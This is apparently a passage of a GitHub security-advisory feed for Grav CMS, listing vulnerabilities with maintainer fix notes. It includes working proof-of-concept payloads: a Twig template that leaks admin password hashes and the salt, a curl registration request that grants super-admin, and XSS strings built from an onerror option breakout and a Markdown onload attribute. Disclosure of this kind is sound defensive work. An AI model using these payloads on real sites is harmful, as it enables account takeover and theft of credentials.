-<p><strong>What changed:</strong> the <code>on_events</code> regex in <code>Security::detectXss()</code> no longer requires quotes or whitespace around <code>=</code>. The previous form:</p>
-<pre><code>'on_events' =&gt; '#(&lt;[^&gt;]+[\s\x00-\x20\"\'\/])(on\s*[a-z]+|xmlns)\s*=[\s|\'\"].*[\s|\'\"]&gt;#iUu'
-</code></pre>
-<p>required <code>[\s|'"]</code> immediately after the <code>=</code>, so <code>&lt;img src=x onerror=alert(1)&gt;</code> slid past. The new regex drops the value-matching tail entirely and just flags the presence of an <code>on*=</code> attribute anywhere inside a tag:</p>
-<pre><code>'on_events' =&gt; '#&lt;[^&gt;]*?[\s\x00-\x20\"\'\/](on\s*[a-z]+|xmlns)\s*=#iu'
-</code></pre>
-<p>Detecting the attribute name + <code>=</code> is enough for a tripwire — the trade-off is occasional false positives on legitimate attribute <em>values</em> containing <code>on*=</code> substrings, which the maintainer can hand-approve.</p>
-<p>This same regex bypass was the detection-layer half of GHSA-c2q3-p4jr-c55f and GHSA-w8cg-7jcj-4vv2; the fix here knocks both down.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Security.php"><code>system/src/Grav/Common/Security.php</code></a>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/DetectXssTest.php"><code>tests/unit/Grav/Common/Security/DetectXssTest.php</code></a> — 18 cases: unquoted PoCs, quoted-form regression, safe-content negatives.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-9695-8fr9-hw5q">https://github.com/getgrav/grav/security/advisories/GHSA-9695-8fr9-hw5q</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-9695-8fr9-hw5q">https://github.com/advisories/GHSA-9695-8fr9-hw5q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9695-8fr9-hw5q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:27:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav Vulnerable to Sensitive Information Disclosure via Accounts Service Bypass]]></title>
-        <id>https://github.com/advisories/GHSA-3f29-pqwf-v4j4</id>
-        <link href="https://github.com/advisories/GHSA-3f29-pqwf-v4j4"/>
-        <updated>2026-05-05T21:26:46.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Information disclosure exists in <code>Grav CMS v1.8.0-beta.29</code>. Despite previous security patches (notably in <code>v1.8.0-beta.27/28</code>) aimed at restricting sensitive object access within the Twig environment, the Accounts Service remains exposed.</p>
-<p>A low-privileged user (EX: Content Editor with only pages.update permissions) can bypass the existing Twig sandbox restrictions by utilizing the <code>grav['accounts']</code> service. Attacker can programmatically load administrative user objects and extract sensitive data, including Bcrypt password hashes and the security salt.</p>
-<h2 id="affected-version">Affected version</h2>
-<p>Grav CMS: <code>v1.8.0-beta.29</code> (and earlier 1.8.x beta versions).</p>
-<p>Note: This vulnerability persists even after the vendor attempted to mitigate similar SSTI vectors in earlier beta releases.</p>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<ol>
-<li><p>Create a low-privileged account (MY CASE IS 'editor_chen') with permissions limited to admin.login and basic page management (create, update, list). Ensure all administrative permissions (Configuration, User Accounts, ...) are explicitly Denied.</p>
-</li>
-<li><p>Login to the Admin panel using  <code>editor_chen</code>. Navigate to Pages and edit the <code>Home</code> page.</p>
-</li>
-<li><p>Under the Advanced tab, ensure Process Twig is enabled .</p>
-</li>
-<li><p>In the Content tab, inject the following Twig payload designed to bypass the <code>isDangerousFunction</code> filter by accessing the internal service container:</p>
-</li>
-</ol>
-<pre><code>---
-title: Information Disclosure Test
-process:
-    twig: true
----
-# Security Audit Results
-- Admin Password Hash: {{ grav['accounts'].load('admin').get('hashed_password') }}
-- Security Salt: {{ grav.config.get('security.salt') }}
-</code></pre>
-<img src="https://github.com/user-attachments/assets/7970216a-2dc6-4d1b-8dfd-b64f3712c9c5" alt="GRAV" height="618" width="1176">
-
-
-<ol start="5">
-<li>Click Save. And navigate to the public page (<code>http://localhost:8000/home</code>). Page will render and display the administrator's Bcrypt hash and the system security salt.<img src="https://github.com/user-attachments/assets/33b7b894-6ae3-4d29-bd2d-8004e9b343e0" alt="GRAV2" height="462" width="1278"></li>
-</ol>
-<h2 id="poc">PoC</h2>
-<pre><code>---
-title: Information Disclosure Test
-process:
-    twig: true
----
-# Security Audit Results
-- Admin Password Hash: {{ grav['accounts'].load('admin').get('hashed_password') }}
-- Security Salt: {{ grav.config.get('security.salt') }}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>Attackers can obtain the password hashes of all registered users, including Super Administrators.</p>
-<p>Extracted hashes can be subjected to offline brute-force or dictionary attacks (EX: USE Hashcat)</p>
-<h2 id="video">Video</h2>
-<p>Pls refer to the attached video
-<video style="max-width: 100%;" controls="controls" src="https://github.com/user-attachments/assets/74d5ae41-7911-4099-b2cc-e6c51b27c68c">
-</video></p>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/d904efc33"><code>d904efc33</code></a> — will ship in <strong>2.0.0-beta.2</strong>.</p>
-<p><strong>What changed:</strong> the HMAC key formerly stored as <code>security.salt</code> in <code>user/config/security.yaml</code> has moved <strong>out of the Config tree</strong> into <code>user/config/security-private.php</code>. On upgrade, the existing salt value is migrated into the new file on first request (preserving CSRF nonces and sessions) and the key is scrubbed from both the live <code>Config</code> object and the on-disk YAML — so <code>{{ grav.config.get('security.salt') }}</code> from a sandboxed Twig template now returns null. The <code>.php</code> extension is blocked from web access by the default <code>user/*.php</code> htaccess rule; the file contains only a <code>return</code> statement, so direct PHP exec produces no output either.</p>
-<p>The PoC's password-hash half (<code>grav['accounts'].load('admin').get('hashed_password')</code>) was already covered by the new Twig content sandbox in 2.0.0-beta.2 — <code>UserCollection::load</code> is not in the sandbox allowlist — see the separate GHSA-58hj-46fw-rcfm advisory.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Security.php"><code>system/src/Grav/Common/Security.php</code></a> — new <code>Security::getNonceKey()</code> + migration.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Utils.php"><code>system/src/Grav/Common/Utils.php</code></a> — <code>generateNonceString</code> now uses the new key.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Service/SessionServiceProvider.php"><code>system/src/Grav/Common/Service/SessionServiceProvider.php</code></a>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Config/Setup.php"><code>system/src/Grav/Common/Config/Setup.php</code></a> — removed auto-gen of <code>security.salt</code>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/config/security.yaml"><code>system/config/security.yaml</code></a> — removed placeholder <code>salt:</code>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/NonceKeySecurityTest.php"><code>tests/unit/Grav/Common/Security/NonceKeySecurityTest.php</code></a> — migration + generation coverage.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-3f29-pqwf-v4j4">https://github.com/getgrav/grav/security/advisories/GHSA-3f29-pqwf-v4j4</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47">https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47</a></li>
-<li><a href="https://github.com/advisories/GHSA-3f29-pqwf-v4j4">https://github.com/advisories/GHSA-3f29-pqwf-v4j4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3f29-pqwf-v4j4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T21:26:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav Vulnerable to Privilege Escalation via Missing Server-Side Validation of groups/access]]></title>
-        <id>https://github.com/advisories/GHSA-pxm6-mhxr-q4mj</id>
-        <link href="https://github.com/advisories/GHSA-pxm6-mhxr-q4mj"/>
-        <updated>2026-05-05T21:26:07.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="bug-report-registration-privilege-escalation-via-missing-server-side-validation-of-groupsaccess">Bug Report: Registration Privilege Escalation via Missing Server-Side Validation of groups/access</h1>
-<h2 id="summary">Summary</h2>
-<p>The <code>Login::register()</code> method in the Login plugin accepts attacker-controlled <code>groups</code> and <code>access</code> fields from the registration POST data without server-side validation. When registration is enabled and <code>groups</code> or <code>access</code> are included in the configured allowed fields list, an unauthenticated user can self-register with <code>admin.super</code> privileges by injecting these fields into the registration request.</p>
-<p>This is a missing server-side validation issue — the only defense is a config-level <code>fields</code> allowlist, which is an admin-facing setting, not a hardcoded security boundary.</p>
-<h2 id="affected-component">Affected Component</h2>
-<ul>
-<li><strong>File:</strong> <code>user/plugins/login/classes/Login.php</code>, lines 246-306</li>
-<li><strong>Method:</strong> <code>Login::register()</code></li>
-<li><strong>Validation:</strong> <code>Login::validateField()</code>, lines 363-432</li>
-<li><strong>Plugin:</strong> Login Plugin 3.8.0</li>
-<li><strong>Grav:</strong> 1.8.0-beta.29</li>
-</ul>
-<h2 id="root-cause">Root Cause</h2>
-<p>In <code>register()</code> (lines 254-267), the <code>groups</code> and <code>access</code> fields are only set to config defaults <strong>if they are not already present in the input data</strong>:</p>
-<pre><code class="language-php">// Line 254-260
-if (!isset($data['groups'])) {
-    $groups = (array) $this-&gt;config-&gt;get('plugins.login.user_registration.groups', []);
-    if (count($groups) &gt; 0) {
-        $data['groups'] = $groups;
-    }
-}
-
-// Line 262-267
-if (!isset($data['access'])) {
-    $access = (array) $this-&gt;config-&gt;get('plugins.login.user_registration.access.site', []);
-    if (count($access) &gt; 0) {
-        $data['access']['site'] = $access;
-    }
-}
-</code></pre>
-<p>If an attacker <strong>includes</strong> <code>groups</code> or <code>access</code> in the POST body, the <code>!isset()</code> check passes and the config defaults are skipped. The attacker's values flow through unchanged.</p>
-<p>Later (lines 298-303), these values are assigned directly to the user object:</p>
-<pre><code class="language-php">if (isset($data['groups'])) {
-    $user-&gt;groups = $data['groups'];  // attacker-controlled
-}
-if (isset($data['access'])) {
-    $user-&gt;access = $data['access'];  // attacker-controlled
-}
-$user-&gt;save();
-</code></pre>
-<p>The <code>validateField()</code> method (lines 363-432) has a <code>switch</code> statement that only validates: <code>username</code>, <code>password</code>, <code>password2</code>, <code>email</code>, <code>permissions</code>, <code>state</code>, and <code>language</code>. The <code>groups</code> and <code>access</code> fields pass through the <code>default</code> case with <strong>no validation at all</strong>.</p>
-<h2 id="precondition">Precondition</h2>
-<p>Registration must be enabled with <code>groups</code> and/or <code>access</code> in the configured allowed fields:</p>
-<pre><code class="language-yaml"># user/config/plugins/login.yaml
-user_registration:
-  enabled: true
-  fields:
-    - username
-    - password
-    - email
-    - fullname
-    - groups    # ← enables the attack
-    - access    # ← enables the attack
-</code></pre>
-<p>This is a configuration the admin UI allows without any warning. An admin adding <code>groups</code> to let users pick a non-privileged group (e.g., <code>editors</code>) unknowingly exposes the escalation path, since there is no validation constraining which groups can be selected.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="malicious-registration-request-unauthenticated">Malicious registration request (unauthenticated):</h3>
-<pre><code class="language-bash">curl -X POST "${TARGET}/user_register" \
-  --data-urlencode "data[username]=attacker" \
-  --data-urlencode "data[password1]=Str0ngP@ss!" \
-  --data-urlencode "data[password2]=Str0ngP@ss!" \
-  --data-urlencode "data[email]=attacker@evil.com" \
-  --data-urlencode "data[fullname]=Attacker" \
-  --data-urlencode "data[groups][]=admins" \
-  --data-urlencode "data[access][admin][login]=true" \
-  --data-urlencode "data[access][admin][super]=true" \
-  --data-urlencode "data[access][site][login]=true" \
-  --data-urlencode "form-nonce=${FORM_NONCE}" \
-  --data-urlencode "__form-name__=user_register" \
-  --data-urlencode "__unique_form_id__=${FORM_UID}"
-</code></pre>
-<h3 id="resulting-account-file-useraccountsattackeryaml">Resulting account file (<code>user/accounts/attacker.yaml</code>):</h3>
-<pre><code class="language-yaml">email: attacker@evil.com
-fullname: Attacker
-groups:
-  - admins
-access:
-  admin:
-    login: true
-    super: true
-  site:
-    login: true
-hashed_password: ...
-state: enabled
-</code></pre>
-<p>The attacker can then log into <code>/admin</code> with full super-admin privileges.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Severity:</strong> Critical (when precondition is met)</li>
-<li><strong>Vector:</strong> Unauthenticated → Super Admin</li>
-<li><strong>Escalation:</strong> Full admin panel access, which chains to RCE via known admin vectors <a href="https://github.com/getgrav/grav/security/advisories/GHSA-4fg4-8cr8-326m">https://github.com/getgrav/grav/security/advisories/GHSA-4fg4-8cr8-326m</a> or Plugin Upload</li>
-<li><strong>Precondition:</strong> Registration enabled with <code>groups</code> or <code>access</code> in allowed fields — a configuration the admin UI permits without warning</li>
-</ul>
-<h2 id="environment">Environment</h2>
-<ul>
-<li>Grav Core: 1.8.0-beta.29</li>
-<li>Login Plugin: 3.8.0</li>
-<li>PHP: 8.4.11</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>Jonathan Dersch at Hacking Cult GmbH <a href="https://hackingcult.de/">https://hackingcult.de/</a></p>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in <strong>grav-plugin-login 3.8.2</strong> (commit <a href="https://github.com/getgrav/grav-plugin-login/commit/3d419a0"><code>3d419a0</code></a>). On the Grav 2.0 line, the login plugin is pinned at <code>&gt;=3.8.2</code> by admin2's <a href="https://github.com/getgrav/grav-plugin-admin2/blob/develop/blueprints.yaml"><code>blueprints.yaml</code></a>, so sites running admin2 with Grav <strong>2.0.0-beta.2</strong> pick the fix up automatically.</p>
-<p><strong>What changed:</strong> the registration form handler now explicitly skips the <code>groups</code> and <code>access</code> privilege fields in the per-field input loop — even if an administrator added them to <code>user_registration.fields</code>. A warning is logged on any attempted injection. Server-side <code>default_values</code>, invitations, and the <code>user_registration.{groups,access}</code> config remain the sole sources of those values.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav-plugin-login/blob/develop/login.php"><code>login.php</code></a> — form handler privilege-field strip.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-pxm6-mhxr-q4mj">https://github.com/getgrav/grav/security/advisories/GHSA-pxm6-mhxr-q4mj</a></li>
-<li><a href="https://github.com/getgrav/grav-plugin-login/commit/3d419a0dabd70aed1fd49afcd5919004a4141da1">https://github.com/getgrav/grav-plugin-login/commit/3d419a0dabd70aed1fd49afcd5919004a4141da1</a></li>
-<li><a href="https://github.com/advisories/GHSA-pxm6-mhxr-q4mj">https://github.com/advisories/GHSA-pxm6-mhxr-q4mj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pxm6-mhxr-q4mj</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T21:26:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav Vulnerable to XSS via Taxonomy Field Values in Admin Panel]]></title>
-        <id>https://github.com/advisories/GHSA-c2q3-p4jr-c55f</id>
-        <link href="https://github.com/advisories/GHSA-c2q3-p4jr-c55f"/>
-        <updated>2026-05-05T21:24:46.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A Stored Cross-Site Scripting (XSS) vulnerability exists in the Grav CMS Form plugin's select field template. Taxonomy tag and category values are rendered with the Twig <code>|raw</code> filter in the admin panel, bypassing the global autoescape protection. An editor-level user can inject arbitrary JavaScript that executes in any administrator's browser session when they view or edit any page in the admin panel.</p>
-<p>Additionally, Grav's built-in XSS detection (<code>Security::detectXss()</code>) can be bypassed by using payloads that close the <code>&lt;option&gt;/&lt;select&gt;</code> context and use unquoted event handlers - the <code>on_events</code> regex fails to match event handlers without quotes or trailing spaces before <code>&gt;</code>.</p>
-<h3 id="important">Important</h3>
-<ul>
-<li>The vulnerability is in the Form plugin (<code>select.html.twig</code>), which is installed by default with Grav</li>
-<li>The XSS is cross-page: a malicious taxonomy value on one page executes when an admin edits any page, because taxonomy options are rendered from a shared global pool</li>
-<li>An editor can exploit this without any other vulnerability - taxonomy fields are not in the server-side restricted fields list</li>
-<li>The <code>HttpOnly</code> flag on session cookies prevents direct session theft, but the XSS can steal the admin nonce and perform privileged actions via JavaScript</li>
-</ul>
-<h3 id="permissions-needed">Permissions Needed</h3>
-<ul>
-<li>Editor: can create or edit pages and set taxonomy tag/category values</li>
-</ul>
-<h3 id="details">Details</h3>
-<p>The Form plugin's select field template renders option values using the <code>|raw</code> Twig filter, which outputs content without HTML escaping:</p>
-<p>File: <code>user/plugins/form/templates/forms/fields/select/select.html.twig</code></p>
-<pre><code class="language-twig">{# Line 55 #}
- avalue|raw 
-
-{# Line 65 #}
- suboption|t|raw 
-
-{# Line 72 #}
- item_value|t|raw 
-</code></pre>
-<p>The taxonomy field in the page editor uses this select template. When a page has taxonomy values (tags, categories), these values are populated as <code>&lt;option&gt;</code> elements in the select dropdown. The <code>value</code> attribute is properly escaped by the browser's attribute encoding, but the <strong>display text</strong> between <code>&lt;option&gt;</code> tags is rendered raw:</p>
-<pre><code class="language-html">&lt;option value="&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/option&gt;
-</code></pre>
-<p>Since taxonomy options are collected globally across all pages (to provide autocomplete/selection), a malicious taxonomy value on any page will appear in the taxonomy dropdown of every page editor - making this a cross-page stored XSS.</p>
-<p>The server-side field restriction in the flex-objects plugin only blocks <code>['form', 'forms', 'process', 'twig']</code> for non-super users. Taxonomy fields are not restricted, so editors can freely set arbitrary taxonomy values.</p>
-<h3 id="xss-detection-bypass">XSS Detection Bypass</h3>
-<p>Grav's <code>Security::detectXss()</code> checks for <code>dangerous_tags</code> (e.g., <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>), <code>on_events</code> (event handlers), and <code>invalid_protocols</code> (e.g., <code>javascript:</code>). However, the <code>on_events</code> regex:</p>
-<pre><code class="language-php">'on_events' =&gt; '#(&lt;[^&gt;]+[a-z\x00-\x20"\'\/)(?:on[a-z]+)\s*=[\s|\'"'].*[\s|\'"']&gt;#iUu'
-</code></pre>
-<p>requires either quotes around the handler value or a trailing space before <code>&gt;</code>. An unquoted handler like <code>onerror=alert(1)&gt;</code> (no space before <code>&gt;</code>) bypasses this check entirely.</p>
-<p>Combined with <code>&lt;/option&gt;&lt;/select&gt;</code> to break out of the select context (neither tag is in <code>dangerous_tags</code>), the full payload evades all three detection layers and triggers no XSS warning in the admin panel.</p>
-<h3 id="poc">PoC</h3>
-<h4 id="step-1-login-as-editor">Step 1: Login as Editor</h4>
-<p>Navigate to <code>http://TARGET/admin/</code> and authenticate with editor credentials.</p>
-<h4 id="step-2-create-a-page-with-malicious-taxonomy">Step 2: Create a Page with Malicious Taxonomy</h4>
-<ul>
-<li>Go to Pages → Add → Add Page</li>
-<li>Title: <code>XSS via editor</code></li>
-<li>Go to <strong>Options</strong> Tap</li>
-<li>On Taxonomies, Add tag:</li>
-</ul>
-<pre><code>&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert('XSS-via-editor')&gt;
-</code></pre>
-<p>This payload:</p>
-<ul>
-<li>Closes <code>&lt;/option&gt;&lt;/select&gt;</code> to break out of the select dropdown context</li>
-<li>Injects an <code>&lt;img&gt;</code> tag with an unquoted <code>onerror</code> handler (bypasses <code>on_events</code> regex)</li>
-<li>Is not in the <code>dangerous_tags</code> list (no <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, etc.)</li>
-<li>Triggers no XSS warning in the admin panel</li>
-</ul>
-<img src="https://github.com/user-attachments/assets/6223cbb2-f04b-46bd-89ce-828c89ad77ab" alt="image" height="857" width="1221">
-
-<h4 id="step-3-trigger-the-xss">Step 3: Trigger the XSS</h4>
-<p>When any administrator navigates to the page editor of any page (not just the malicious one), the JavaScript executes immediately.</p>
-<img src="https://github.com/user-attachments/assets/f008b0f2-dedb-4b22-a74a-cdc0d7325cb4" alt="image" height="856" width="1224">
-
-<p>The XSS fires because taxonomy tag options are collected globally across all pages and rendered with <code>|raw</code> in the select dropdown template. The payload breaks out of the <code>&lt;option&gt;</code> context, and the browser renders the <code>&lt;img&gt;</code> tag as a regular DOM element.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Session hijacking: While <code>HttpOnly</code> prevents direct cookie theft, the XSS can steal the admin nonce token and perform any admin action via AJAX requests</li>
-<li>Privilege escalation: An editor can perform admin-only actions (create users, modify system configuration, install plugins) through the hijacked admin session</li>
-<li>Cross-page impact: A single malicious taxonomy value affects the entire admin panel - every page editor view is compromised</li>
-</ul>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed across two repos:</p>
-<ol>
-<li><p><strong>grav-plugin-form 9.0.1</strong> (commit <a href="https://github.com/getgrav/grav-plugin-form/commit/6bffb4c"><code>6bffb4c</code></a>) — the primary fix. All four <code>|raw</code> filters in <a href="https://github.com/getgrav/grav-plugin-form/blob/develop/templates/forms/fields/select/select.html.twig"><code>templates/forms/fields/select/select.html.twig</code></a> (placeholder, avalue, suboption, item_value) have been removed. Option labels — including taxonomy values that propagate cross-page through the admin's shared selection pool — now go through Twig's default escaper, so a lower-privileged editor can no longer inject script that runs in an admin's browser when they open any page editor.</p>
-</li>
-<li><p><strong>Grav core on the <code>2.0</code> branch</strong> (commit <a href="https://github.com/getgrav/grav/commit/5a12f9be8"><code>5a12f9be8</code></a>, ships in <strong>2.0.0-beta.2</strong>) — closes the detection-bypass half of the report. The <code>on_events</code> regex in <code>Security::detectXss()</code> is tightened so unquoted handlers like <code>onerror=alert(1)&gt;</code> are flagged (see separate GHSA-9695-8fr9-hw5q), and <code>option</code>/<code>select</code> have been added to default <code>security.xss_dangerous_tags</code> so <code>&lt;/option&gt;&lt;/select&gt;…</code> tripwires the detector (see separate GHSA-w8cg-7jcj-4vv2).</p>
-</li>
-</ol>
-<p>Sites running admin2 on Grav 2.0.0-beta.2 get the 9.0.1 form plugin automatically via its existing dependency graph.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav-plugin-form/blob/develop/templates/forms/fields/select/select.html.twig"><code>templates/forms/fields/select/select.html.twig</code></a> — four <code>|raw</code> removed.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/config/security.yaml"><code>system/config/security.yaml</code></a> — dangerous-tags list extended.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Security.php"><code>system/src/Grav/Common/Security.php</code></a> — <code>on_events</code> regex tightened.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/DetectXssTest.php"><code>tests/unit/Grav/Common/Security/DetectXssTest.php</code></a> — includes the GHSA-c2q3 PoC payload.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-c2q3-p4jr-c55f">https://github.com/getgrav/grav/security/advisories/GHSA-c2q3-p4jr-c55f</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-c2q3-p4jr-c55f">https://github.com/advisories/GHSA-c2q3-p4jr-c55f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c2q3-p4jr-c55f</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T21:24:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav CMS vulnerable to stored XSS via Markdown media attribute() action]]></title>
-        <id>https://github.com/advisories/GHSA-r7fx-8g49-7hhr</id>
-        <link href="https://github.com/advisories/GHSA-r7fx-8g49-7hhr"/>
-        <updated>2026-05-05T21:24:09.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An authenticated user with page editing permissions can inject an executable JavaScript event-handler attribute into rendered image HTML through Grav's Markdown media action syntax.</p>
-<p>The issue is caused by Markdown image query parameters being converted into callable media actions. The public <code>attribute()</code> media method can be reached this way, allowing an editor to set an arbitrary HTML attribute name and value on the generated image element.</p>
-<p>For example, this Markdown:</p>
-<pre><code class="language-markdown">![Quarterly market overview](market-overview.gif?attribute=onload,alert(document.domain))
-</code></pre>
-<p>is rendered as an image tag containing an executable <code>onload</code> handler:</p>
-<pre><code class="language-html">&lt;img onload="alert(document.domain)" alt="Quarterly market overview" src="/user/pages/03.campaigns/market-overview.gif?..."&gt;
-</code></pre>
-<p>This results in stored XSS when another user views the affected page. In a multi-user Grav installation, a lower-privileged page editor could use this to target administrators or reviewers who preview or view editor-controlled content.</p>
-<p>Tested versions:</p>
-<ul>
-<li>Grav CMS: 1.7.49.5</li>
-<li>Admin Plugin: 1.10.49.1</li>
-</ul>
-<p>Suggested classification:</p>
-<ul>
-<li>CWE-79: Improper Neutralization of Input During Web Page Generation</li>
-<li>Stored Cross-Site Scripting</li>
-<li>Suggested CVSS v4.0 score if page editing is considered high privilege: 6.9 Medium</li>
-<li>Suggested CVSS v4.0 vector: <code>CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:P/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N</code></li>
-<li>Suggested CVSS v3.1 score if page editing is considered high privilege: 6.9 Medium</li>
-<li>Suggested CVSS v3.1 vector: <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N</code></li>
-</ul>
-<h3 id="details">Details</h3>
-<p>The issue appears to come from this source-to-sink flow:</p>
-<ol>
-<li><code>ParsedownGravTrait::inlineImage()</code> processes Markdown images.</li>
-<li><code>Excerpts::processImageExcerpt()</code> resolves the referenced media object.</li>
-<li><code>Excerpts::processMediaActions()</code> parses the image URL query string into media actions.</li>
-<li><code>call_user_func_array()</code> invokes the requested action method on the media object.</li>
-<li><code>MediaObjectTrait::attribute()</code> stores the attacker-controlled attribute name and value.</li>
-<li>The media object returns a Parsedown element containing the injected attribute.</li>
-<li>Parsedown renders the attribute name into the final HTML.</li>
-</ol>
-<p>Relevant code paths:</p>
-<pre><code class="language-text">system/src/Grav/Common/Markdown/ParsedownGravTrait.php
-system/src/Grav/Common/Page/Markdown/Excerpts.php
-system/src/Grav/Common/Media/Traits/MediaObjectTrait.php
-system/src/Grav/Common/Page/Medium/StaticImageMedium.php
-system/src/Grav/Common/Page/Medium/ImageMedium.php
-vendor/erusev/parsedown/Parsedown.php
-</code></pre>
-<p>In <code>system/src/Grav/Common/Markdown/ParsedownGravTrait.php</code>, Markdown image excerpts are passed into Grav-specific media handling:</p>
-<pre><code class="language-php">if (isset($excerpt['element']['attributes']['src'])) {
-    $excerpt = $this-&gt;excerpts-&gt;processImageExcerpt($excerpt);
-}
-</code></pre>
-<p>In <code>system/src/Grav/Common/Page/Markdown/Excerpts.php</code>, query string parameters are converted into media action calls. The query parameter name becomes the method name:</p>
-<pre><code class="language-php">$carry[] = ['method' =&gt; $parts[0], 'params' =&gt; $value];
-</code></pre>
-<p>The requested method is later invoked dynamically:</p>
-<pre><code class="language-php">$medium = call_user_func_array([$medium, $action['method']], $args);
-</code></pre>
-<p>For the payload:</p>
-<pre><code class="language-text">attribute=onload,alert(document.domain)
-</code></pre>
-<p>the method is <code>attribute</code>, and the arguments are <code>onload</code> and <code>alert(document.domain)</code>.</p>
-<p>In <code>system/src/Grav/Common/Media/Traits/MediaObjectTrait.php</code>, <code>attribute()</code> stores the caller-controlled attribute name directly:</p>
-<pre><code class="language-php">public function attribute($attribute = null, $value = '')
-{
-    if (!empty($attribute)) {
-        $this-&gt;attributes[$attribute] = $value;
-    }
-    return $this;
-}
-</code></pre>
-<p>The image media classes then return the collected attributes as attributes for an <code>img</code> element.</p>
-<p>In <code>system/src/Grav/Common/Page/Medium/StaticImageMedium.php</code>:</p>
-<pre><code class="language-php">return ['name' =&gt; 'img', 'attributes' =&gt; $attributes];
-</code></pre>
-<p>The non-static image path in <code>system/src/Grav/Common/Page/Medium/ImageMedium.php</code> also returns image attributes in the same way.</p>
-<p>Finally, in <code>vendor/erusev/parsedown/Parsedown.php</code>, the attribute value is escaped, but the attribute name is rendered as-is:</p>
-<pre><code class="language-php">$markup .= ' '.$name.'="'.self::escape($value).'"';
-</code></pre>
-<p>As a result, the attacker-controlled attribute name <code>onload</code> is emitted into the final HTML and executes as a browser event handler.</p>
